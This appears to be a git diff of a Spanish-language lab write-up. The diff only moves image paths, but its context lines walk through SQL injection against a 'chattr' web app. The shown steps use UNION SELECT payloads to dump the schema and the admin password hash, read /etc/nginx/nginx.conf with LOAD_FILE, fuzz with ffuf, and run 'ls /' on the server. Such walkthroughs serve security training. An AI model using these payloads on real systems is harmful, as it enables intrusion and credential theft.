@@ -16,7 +16,7 @@
 Es https (con la `s` al final)
 
 
-![BurpSuite](imgs/burp.png)
+![BurpSuite](imgs/SQLi/burp.png)
 
 3. Le damos en "create account" para crear una cuenta:
 En mi caso yo pondre los datos:
@@ -24,11 +24,11 @@ username=fabric047
 password=Test12345%^6789
 invitationCode=aaaa-bbbb-1111
 
-![CreateAccount](imgs/create_account.png)
+![CreateAccount](imgs/SQLi/create_account.png)
 
 pero nos aparece el mensaje: "Invalid invitation code" ya que no existe ese codigo de invitacion (porque lo inventamos)
 
-![InvalidInvitationCode](imgs/invalid_invitationcode.png)
+![InvalidInvitationCode](imgs/SQLi/invalid_invitationcode.png)
 
 4. Usemos el Burp Suite:
 
@@ -43,11 +43,11 @@ invitationCode=aaaa-bbbb-1111
 
 Entraremos al burp de nuevo y tendremos el method post. Luego le damos en "send to repeater":
 
-![Send_to_Repeater](imgs/sendtorepeater.png)
+![Send_to_Repeater](imgs/SQLi/sendtorepeater.png)
 
 6. Nos vamos al repeater:
 
-![Repeater](imgs/repeater1.png)
+![Repeater](imgs/SQLi/repeater1.png)
 
 Abajo tenemos esto:
 ```
@@ -79,14 +79,14 @@ Sabemos que Falso OR Verdadero es igual a Verdadero
 
 7. Le damos en "send":
 
-![Repeater2](imgs/repeater2.png)
+![Repeater2](imgs/SQLi/repeater2.png)
 
 y en el Response>Pretty ( a la derecha ) obtendremos: Location: /login.php?s=account+created+successfully!
 
 
 8. Entramos a la pagina y le damos en login para iniciar sesion con el usuario y password con el que nos registramos
 
-![Login](imgs/login.png)
+![Login](imgs/SQLi/login.png)
 
 9. A partir de aqui, nos concentramos solo en el cuadro de busqueda (search)
 
@@ -94,7 +94,7 @@ Por ejemplo, intentemos con `admin') union select 1,2,3-- -`: No obtenemos nada 
 Ahora, intentemos con `admin') union select 1,2,3,4-- -` y tenemos esto:
 
 
-![primero](imgs/primero.png)
+![primero](imgs/SQLi/primero.png)
 
 Entonces, sabemos que solo la tercer columna sera mostrada.
 
@@ -106,7 +106,7 @@ Primero debemos conocer el nombre de la base de datos:
 admin') union select 1,2, database(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-![databasename](imgs/databasename.png)
+![databasename](imgs/SQLi/databasename.png)
 
 `database()` devolvió `chattr`, es decir, esa es la base de datos que está usando la aplicación.
 
@@ -116,7 +116,7 @@ Ahora necesitamos saber las tablas existentes dentro de la base de datos chattr
 admin') union select 1,2, TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
 ```
 
-![tablesinchattr](imgs/tablesinchattr.png)
+![tablesinchattr](imgs/SQLi/tablesinchattr.png)
 
 Tenemos 3 tablas: Users, InvitationCodes y Messages.
 La tabla Users parece que tiene informacion interesante.
@@ -127,7 +127,7 @@ Vamos a ver sus columnas:
 xd') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
 ```
 
-![Columnas](imgs/columns.png)
+![Columnas](imgs/SQLi/columns.png)
 
 Ahora sabemos que la tabla Users es algo asi:
 
@@ -142,7 +142,7 @@ Por fin!!! Obtengamos la password hash del admin:
 xd') union select 1,2,Password,4 from Users where Username="admin"-- -
 ```
 
-![passwordhash](imgs/passwordhash.png)
+![passwordhash](imgs/SQLi/passwordhash.png)
 
 ---
 
@@ -158,7 +158,7 @@ xd') union select 1,2,Password,4 from Users where Username="admin"-- -
 xd') union select 1,2,user(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-![usuario](imgs/usuario.png)
+![usuario](imgs/SQLi/usuario.png)
 
 Estamos como `chattr_dbUser@localhost`
 
@@ -167,7 +167,7 @@ Estamos como `chattr_dbUser@localhost`
 ```
 xd') UNION SELECT 1, 2, privilege_type, grantee FROM information_schema.user_privileges-- -
 ```
-![privilegios](imgs/privilegios.png)
+![privilegios](imgs/SQLi/privilegios.png)
 
 El privilegio FILE en MySQL permite lectura a los archivos de MySQL.
 
@@ -178,7 +178,7 @@ Intentemos con nginx:
 ```
 xd' ) UNION SELECT 1 , 2 , LOAD_FILE ( "/etc/nginx/nginx.conf" ), 4-- -
 ```
-![nginx](imgs/nginx.png)
+![nginx](imgs/SQLi/nginx.png)
 
 Nos dice que las configuraciones están dentro de /etc/nginx/sites-enabled/directory.
 
@@ -194,7 +194,7 @@ En el `GET` cambiamos test por FUZZ para que quede asi:
 
 Despues, guardamos el archivo con el nombre `conf.req`
 
-![save](imgs/save.png)
+![save](imgs/SQLi/save.png)
 
 5. Usemos FUZZ:
 
@@ -229,7 +229,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -req
 
 Y nos va a aparecer un monton de resultados
 
-![fuzz](imgs/fuzz.png)
+![fuzz](imgs/SQLi/fuzz.png)
 
 Nos damos cuenta que la mayoria dice: `Size: 5372`. Entonces, podemos filtrar ese tamaño:
 ```
@@ -238,7 +238,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -req
 
 Y obtenemos `default`
 
-![default](imgs/default.png)
+![default](imgs/SQLi/default.png)
 
 6. Regresemos a la pagina y pongamos:
 
@@ -246,7 +246,7 @@ Y obtenemos `default`
 
 Obtenemos:
 
-![respuesta2](imgs/answer2.png)
+![respuesta2](imgs/SQLi/answer2.png)
 
 
 
@@ -295,7 +295,7 @@ Ahora debemos encontrar ese [aqui_va_algo]
 Con eso estamos, basicamente, ejecutando: `ls /`
 Como sabemos por linux, `ls` sirve para mostrar todos los archivo de `/` que es la carpeta root
 
-![ls](imgs/ls.png)
+![ls](imgs/SQLi/ls.png)
 
 Uno de esos es `flag_876a4c.txt`!!!
 
